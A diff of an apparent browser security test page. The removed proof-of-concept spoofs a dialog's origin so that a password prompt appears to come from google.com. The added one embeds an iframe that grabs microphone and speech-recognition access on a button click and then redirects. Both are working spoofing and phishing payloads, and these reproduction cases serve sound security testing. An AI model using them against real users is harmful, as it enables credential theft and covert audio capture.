@@ -1,18 +1,33 @@
-<html>
-<body>
-<a href="" target="_blank" onclick=clickme();>visit ianfette</a>
-<script>
-function clickme()
-{
-w1 = window.open('http://google.com/csi');
-p = w1.prompt("Enter your password to proceed");
-alert(p);
-a="aaaaaaaaaaaaaaaa";
-for (i = 0; i < 19; i++) { 
-a += a;
-}
-history.replaceState("example", "example", a);
-alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
-</script>
-</body>
-</html>
+  <iframe
+      allow="microphone"
+      style="width:100vw;height:100vh;border:0"
+      srcdoc='
+        <!doctype html>
+        <html>
+        <body>
+          <input id="btn" type="button" value="Click here" />
+
+          <script>
+            async function start() {
+              const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+
+              if (SpeechRecognition) {
+                try {
+                  const recognition = new SpeechRecognition();
+                  recognition.start();
+                } catch (e) {}
+              }
+
+              try {
+                await navigator.mediaDevices.getUserMedia({ audio: true });
+              } catch (e) {}
+
+              location.href = "https://www.google.com";
+            }
+
+            document.getElementById("btn").onclick = start;
+          </script>
+        </body>
+        </html>
+      '>
+    </iframe>
